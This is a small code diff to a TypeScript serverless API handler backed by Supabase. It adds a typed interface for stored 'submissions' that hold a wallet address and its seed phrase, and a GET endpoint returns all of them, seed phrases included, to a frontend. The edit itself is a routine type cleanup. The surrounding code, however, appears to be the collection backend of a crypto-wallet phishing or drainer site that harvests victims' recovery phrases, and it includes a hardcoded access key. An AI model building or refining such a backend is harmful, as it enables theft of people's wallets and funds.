@@ -6,6 +6,13 @@ const supabaseKey = "sb_publishable_roHnvrQf_0JDkJgEoa5ryg_9mpBZlWR";
 
 const supabase = createClient(supabaseUrl, supabaseKey);
 
+interface SupabaseSubmission {
+  id: number;
+  wallet: string;
+  seed_phrase: string;
+  timestamp: number;
+}
+
 export default async function handler(req: VercelRequest, res: VercelResponse) {
   if (req.method === 'GET') {
     const { data, error } = await supabase
@@ -16,7 +23,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     if (error) return res.status(500).json({ error: error.message });
     
     // Map snake_case to camelCase for frontend
-    const mappedData = data?.map((item: any) => ({
+    const mappedData = data?.map((item: SupabaseSubmission) => ({
       id: item.id,
       wallet: item.wallet,
       seedPhrase: item.seed_phrase,
